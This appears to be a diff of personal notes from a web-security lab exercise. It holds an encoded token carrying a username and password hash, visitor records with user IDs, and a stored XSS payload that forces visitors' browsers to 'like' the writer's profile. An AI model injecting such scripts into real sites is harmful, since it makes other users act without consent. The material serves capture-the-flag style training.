@@ -1,1 +1,8 @@
 csrf token - eyd1c2VybmFtZSc6ICd5b3NyaScsICdwYXNzd29yZF9oYXNoJzogJ0R6NThLUlFiYlRBWUNBY2NPVzRGUFIwVkRISXJLalE4S0E9PSd9
+{"status":"success","user_data":{"FLAG_1":false,"FLAG_2":false,"
+0	"John - Visited you - Sun Jan 18 11:31:47 2026 - UserID: 918203"
+1	"Jimmy - Visited you - Sun Jan 18 11:31:47 2026 - UserID: 32781850"
+2	"Dexter - Visited you - Sun Jan 18 11:31:47 2026 - UserID: 811152675"
+
+Yosri means our ID - 58263966
+"><script>fetch(`http://web0x01.hbtn/api/a3/xss_stored/like/58263966`)</script>
